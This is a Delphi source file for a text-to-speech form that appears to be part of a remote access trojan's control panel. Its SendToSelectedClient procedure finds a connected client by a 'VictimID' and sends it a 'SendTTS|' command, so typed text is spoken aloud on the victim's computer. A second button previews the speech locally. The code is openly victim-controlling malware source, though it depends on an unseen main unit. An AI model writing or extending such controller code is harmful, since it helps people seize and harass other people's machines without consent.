unit FrmTTS;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, System.Win.ComObj;

type
  TForm4 = class(TForm)
    Memo1: TMemo;
    Button1: TButton;
    Button2: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form4: TForm4;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm4.Button1Click(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID, 'SendTTS|' + Memo1.text);
end;

procedure TForm4.Button2Click(Sender: TObject);
var
Voice: Variant;
begin
        Voice := CreateOleObject('SAPI.SpVoice');
        Voice.speak(Memo1.Text);
end;

end.
